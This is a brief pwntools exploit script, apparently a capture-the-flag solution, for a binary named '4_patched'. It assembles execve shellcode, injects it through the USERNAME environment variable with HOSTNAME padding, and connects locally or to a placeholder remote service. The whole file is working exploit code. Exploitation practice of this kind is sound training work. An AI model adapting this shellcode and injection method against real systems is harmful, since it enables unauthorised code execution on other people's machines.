#!/usr/bin/env python3

from pwn import *

exe = ELF("./4_patched")

context.binary = exe
context.arch = 'amd64'


context.arch = 'amd64'
shellcode = asm("""
    xor     rax, rax
    jmp     short str
get_addr:
    pop     rdi
    push    rax
    push    rdi
    mov     rsi, rsp
    xor     rdx, rdx
    mov     rax, 59
    syscall
str:
    call    get_addr
    .byte 0x2f,0x75,0x73,0x72,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x2f,0x62,0x69,0x6e,0x2f,0x6c,0x33,0x33,0x74,0x00
""")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="")
    else:
        r = remote("addr", 1337)

    return r


def main():
    print(len(shellcode))
    os.environ['USERNAME'] = b"A"*10 + shellcode[:40]
    os.environ['HOSTNAME'] = "A"*100
    r = conn()

    
    r.interactive()


if __name__ == "__main__":
    main()
